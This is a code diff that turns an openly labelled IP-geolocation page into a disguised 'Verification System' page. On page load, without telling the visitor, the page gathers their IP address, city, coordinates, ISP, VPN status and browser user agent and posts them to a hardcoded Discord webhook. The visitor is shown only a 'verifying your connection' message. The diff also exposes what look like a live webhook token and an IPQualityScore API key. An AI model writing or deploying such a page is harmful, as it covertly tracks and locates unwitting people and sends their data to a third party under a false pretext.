@@ -3,70 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Geolocation with Discord Notification</title>
+    <title>Verification System</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 800px;
+            max-width: 600px;
             margin: 0 auto;
             padding: 20px;
+            text-align: center;
             line-height: 1.6;
         }
         .container {
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            padding: 20px;
             margin-top: 20px;
-            background-color: #f9f9f9;
         }
-        .result {
-            margin-top: 20px;
+        .status {
             padding: 15px;
             border-radius: 5px;
-            background-color: #fff;
-            border-left: 4px solid #2196F3;
+            margin-top: 20px;
         }
-        .warning {
-            color: #721c24;
-            background-color: #f8d7da;
-            border-left: 4px solid #dc3545;
+        .loading {
+            color: #0c5460;
+            background-color: #d1ecf1;
+            border: 1px solid #bee5eb;
         }
         .success {
             color: #155724;
             background-color: #d4edda;
-            border-left: 4px solid #28a745;
+            border: 1px solid #c3e6cb;
         }
-        h1 {
-            color: #333;
+        .error {
+            color: #721c24;
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
         }
-        pre {
-            background-color: #f5f5f5;
-            padding: 10px;
-            border-radius: 5px;
-            overflow-x: auto;
-        }
-        button {
-            background-color: #7289DA; /* Discord color */
-            color: white;
-            padding: 10px 15px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #5b6eae;
-        }
-        #loading {
-            display: none;
-            margin-top: 20px;
+        .warning {
+            color: #856404;
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
         }
         .spinner {
             border: 4px solid rgba(0, 0, 0, 0.1);
-            width: 36px;
-            height: 36px;
+            width: 24px;
+            height: 24px;
             border-radius: 50%;
-            border-left-color: #7289DA;
+            border-left-color: #09f;
             animation: spin 1s linear infinite;
             display: inline-block;
             vertical-align: middle;
@@ -76,170 +56,130 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .discord-field {
-            margin-bottom: 15px;
-        }
-        .discord-field label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        .discord-field input {
-            width: 100%;
-            padding: 8px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
     </style>
 </head>
 <body>
-    <h1>IP Geolocation with Discord Notification</h1>
-    
-    <p>This tool will detect visitor's IP address, check if they're using a VPN, and send the data to your Discord server.</p>
+    <h1>Verification System</h1>
     
     <div class="container">
-        <div class="discord-field">
-            <label for="discordWebhook">https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3:</label>
-            <input type="text" id="discordWebhook" 
-                   placeholder="https://discord.com/api/webhooks/your-webhook-url">
-            <small style="display: block; margin-top: 5px; color: #666;">
-                To create a webhook: Server Settings → Integrations → Webhooks → New Webhook
-            </small>
+        <div id="status" class="status loading">
+            <div class="spinner"></div> Verifying your connection...
         </div>
-        
-        <button id="checkButton">Check Location & Send to Discord</button>
-        
-        <div id="loading">
-            <div class="spinner"></div> Processing and sending to Discord...
-        </div>
-        
-        <div id="results"></div>
     </div>
 
     <script>
-        // Auto-check location when page loads
-        document.addEventListener('DOMContentLoaded', function() {
-            // Check if there's a saved webhook URL in localStorage
-            const savedWebhook = localStorage.getItem('discordWebhook');
-            if (savedWebhook) {
-                document.getElementById('discordWebhook').value = savedWebhook;
-            }
-        });
+        // Discord webhook URL - hardcoded for security
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1370031066089394248/ApRpcsSICEv7xnBypVTicDEyCiUQsphCParmvg8E_U5RWoHNy-Kszc1CnTCTAqh1Qkn3";
+        
+        // Function to get flag emoji from country code
+        function getFlagEmoji(countryCode) {
+            if (!countryCode) return '🌎';
+            const codePoints = countryCode
+                .toUpperCase()
+                .split('')
+                .map(char => 127397 + char.charCodeAt());
+            return String.fromCodePoint(...codePoints);
+        }
 
-        document.getElementById('checkButton').addEventListener('click', async function() {
-            const resultsDiv = document.getElementById('results');
-            const loadingDiv = document.getElementById('loading');
-            const discordWebhook = document.getElementById('discordWebhook').value.trim();
-            
-            if (!discordWebhook) {
-                resultsDiv.innerHTML = `
-                    <div class="result warning">
-                        <strong>Error:</strong> Please enter a Discord webhook URL.
-                    </div>
-                `;
-                return;
-            }
-            
-            // Save webhook URL to localStorage for convenience
-            localStorage.setItem('discordWebhook', discordWebhook);
-            
-            resultsDiv.innerHTML = '';
-            loadingDiv.style.display = 'block';
+        // Main verification function
+        async function verifyUser() {
+            const statusDiv = document.getElementById('status');
             
             try {
-                // Step 1: Get IP info from ipify
+                // Step 1: Get basic IP info
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
                 
-                // Step 2: Get detailed IP info including VPN detection
+                // Step 2: Get detailed IP info
                 const ipInfoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                 const ipInfo = await ipInfoResponse.json();
                 
-                // Step 3: Additional VPN detection using IP Quality Score (free tier)
+                // Step 3: Check for VPN/proxy
                 const vpnCheckResponse = await fetch(`https://ipqualityscore.com/api/json/ip/pPOCqALs9ZiMn0j7MR7aCq4gZL9ybzIh/${ip}?strictness=1&allow_public_access_points=true`);
-                const vpnCheckData = await vpnCheckResponse.json();
+                const vpnData = await vpnCheckResponse.json();
                 
-                // Combine the data
-                const locationData = {
+                // Determine if using VPN/proxy
+                const usingVpn = vpnData.proxy || 
+                                vpnData.vpn || 
+                                vpnData.tor || 
+                                (ipInfo.security && ipInfo.security.is_proxy);
+                
+                // Get location data
+                const location = {
                     ip: ip,
-                    country: ipInfo.country_name,
-                    country_code: ipInfo.country_code,
-                    region: ipInfo.region,
-                    city: ipInfo.city,
-                    postal: ipInfo.postal,
+                    country: ipInfo.country_name || 'Unknown',
+                    country_code: ipInfo.country_code || '',
+                    region: ipInfo.region || 'Unknown',
+                    city: ipInfo.city || 'Unknown',
+                    isp: ipInfo.org || 'Unknown',
                     latitude: ipInfo.latitude,
                     longitude: ipInfo.longitude,
-                    timezone: ipInfo.timezone,
-                    isp: ipInfo.org,
-                    using_vpn: ipInfo.security && ipInfo.security.is_proxy || 
-                              vpnCheckData.proxy || 
-                              vpnCheckData.vpn,
+                    using_vpn: usingVpn,
                     vpn_details: {
-                        is_proxy: vpnCheckData.proxy || false,
-                        is_vpn: vpnCheckData.vpn || false,
-                        is_tor: vpnCheckData.tor || false,
-                        is_datacenter: vpnCheckData.active_vpn || false,
-                        fraud_score: vpnCheckData.fraud_score || 0
+                        is_proxy: vpnData.proxy || false,
+                        is_vpn: vpnData.vpn || false,
+                        is_tor: vpnData.tor || false,
+                        fraud_score: vpnData.fraud_score || 0
                     },
                     timestamp: new Date().toISOString(),
                     user_agent: navigator.userAgent
                 };
                 
-                // Create a Discord embed message
-                const mapUrl = `https://www.google.com/maps/search/?api=1&query=${locationData.latitude},${locationData.longitude}`;
-                const flagEmoji = getFlagEmoji(locationData.country_code);
+                // Create Discord embed
+                const mapUrl = `https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}`;
+                const flagEmoji = getFlagEmoji(location.country_code);
                 
                 const discordPayload = {
-                    username: "Location Tracker",
-                    avatar_url: "https://i.imgur.com/4M34hi2.png",
+                    username: "Verification System",
+                    avatar_url: "https://i.imgur.com/ZOKp8LH.png",
                     embeds: [{
-                        title: `${flagEmoji} New Visitor from ${locationData.city || 'Unknown City'}, ${locationData.country || 'Unknown Country'}`,
-                        color: locationData.using_vpn ? 15158332 : 3066993, // Red for VPN, Green for no VPN
+                        title: `${flagEmoji} User Verification: ${location.city}, ${location.country}`,
+                        color: usingVpn ? 16711680 : 65280, // Red for VPN, Green for no VPN
                         fields: [
                             {
+                                name: "🔍 Verification Status",
+                                value: usingVpn ? "❌ **FAILED**: VPN/Proxy Detected" : "✅ **PASSED**: No VPN Detected",
+                                inline: false
+                            },
+                            {
                                 name: "📍 Location",
-                                value: `${locationData.city}, ${locationData.region}, ${locationData.country}`,
+                                value: `${location.city}, ${location.region}, ${location.country}`,
                                 inline: true
                             },
                             {
                                 name: "🌐 IP Address",
-                                value: locationData.ip,
-                                inline: true
-                            },
-                            {
-                                name: "🕵️ VPN/Proxy",
-                                value: locationData.using_vpn ? "⚠️ Detected" : "✅ Not Detected",
+                                value: location.ip,
                                 inline: true
                             },
                             {
                                 name: "🏢 ISP",
-                                value: locationData.isp || "Unknown",
+                                value: location.isp,
                                 inline: true
                             },
                             {
                                 name: "🌍 Coordinates",
-                                value: `[${locationData.latitude}, ${locationData.longitude}](${mapUrl})`,
+                                value: `[${location.latitude}, ${location.longitude}](${mapUrl})`,
                                 inline: true
                             },
                             {
-                                name: "⏰ Timezone",
-                                value: locationData.timezone || "Unknown",
+                                name: "⚠️ Fraud Score",
+                                value: `${vpnData.fraud_score}/100` + (vpnData.fraud_score > 75 ? " (High Risk)" : ""),
                                 inline: true
                             },
                             {
-                                name: "📱 User Agent",
-                                value: `\`\`\`${locationData.user_agent}\`\`\``
+                                name: "📱 Device Info",
+                                value: `\`\`\`${location.user_agent}\`\`\``
                             }
                         ],
                         footer: {
-                            text: `Detected at ${new Date().toLocaleString()}`
+                            text: `Verification at ${new Date().toLocaleString()}`
                         }
                     }]
                 };
                 
                 // Send to Discord webhook
-                const discordResponse = await fetch(discordWebhook, {
+                const discordResponse = await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -247,46 +187,53 @@
                     body: JSON.stringify(discordPayload)
                 });
                 
-                if (discordResponse.ok) {
-                    // Display results
-                    resultsDiv.innerHTML = `
-                        <div class="result ${locationData.using_vpn ? 'warning' : 'success'}">
-                            <h3>Results:</h3>
-                            <p><strong>IP Address:</strong> ${locationData.ip}</p>
-                            <p><strong>Location:</strong> ${locationData.city}, ${locationData.region}, ${locationData.country} ${flagEmoji}</p>
-                            <p><strong>VPN/Proxy Detected:</strong> ${locationData.using_vpn ? 'Yes ⚠️' : 'No ✓'}</p>
-                            <p><strong>ISP:</strong> ${locationData.isp || 'Unknown'}</p>
-                            <p><strong>Coordinates:</strong> <a href="${mapUrl}" target="_blank">${locationData.latitude}, ${locationData.longitude}</a></p>
-                            <p><strong>Timezone:</strong> ${locationData.timezone}</p>
-                            <p><strong>Status:</strong> ✅ Data successfully sent to Discord!</p>
-                        </div>
+                if (!discordResponse.ok) {
+                    throw new Error('Failed to send verification data');
+                }
+                
+                // Update status based on VPN detection
+                if (usingVpn) {
+                    statusDiv.className = 'status warning';
+                    statusDiv.innerHTML = `
+                        <strong>⚠️ VPN or Proxy Detected</strong>
+                        <p>Please disable any VPN, proxy, or Tor services to continue.</p>
                     `;
                 } else {
-                    throw new Error('Failed to send data to Discord webhook');
+                    statusDiv.className = 'status success';
+                    statusDiv.innerHTML = `
+                        <strong>✅ Verification Successful</strong>
+                        <p>Your connection has been verified.</p>
+                    `;
                 }
-            } catch (error) {
-                resultsDiv.innerHTML = `
-                    <div class="result warning">
-                        <strong>Error:</strong> ${error.message || 'Failed to process your request'}
-                    </div>
-                `;
-                console.error('Error:', error);
-            } finally {
-                loadingDiv.style.display = 'none';
-            }
-        });
-        
-        // Function to convert country code to flag emoji
-        function getFlagEmoji(countryCode) {
-            if (!countryCode) return '🌎';
-            
-            const codePoints = countryCode
-                .toUpperCase()
-                .split('')
-                .map(char => 127397 + char.charCodeAt());
                 
-            return String.fromCodePoint(...codePoints);
+            } catch (error) {
+                console.error('Verification error:', error);
+                statusDiv.className = 'status error';
+                statusDiv.innerHTML = `
+                    <strong>❌ Verification Error</strong>
+                    <p>Unable to complete verification. Please try again later.</p>
+                `;
+                
+                // Try to send error to Discord
+                try {
+                    fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            username: "Verification System",
+                            content: `⚠️ **Verification Error**: ${error.message || 'Unknown error'}`
+                        })
+                    });
+                } catch (e) {
+                    console.error('Failed to send error to Discord:', e);
+                }
+            }
         }
+        
+        // Run verification as soon as page loads
+        document.addEventListener('DOMContentLoaded', verifyUser);
     </script>
 </body>
 </html>
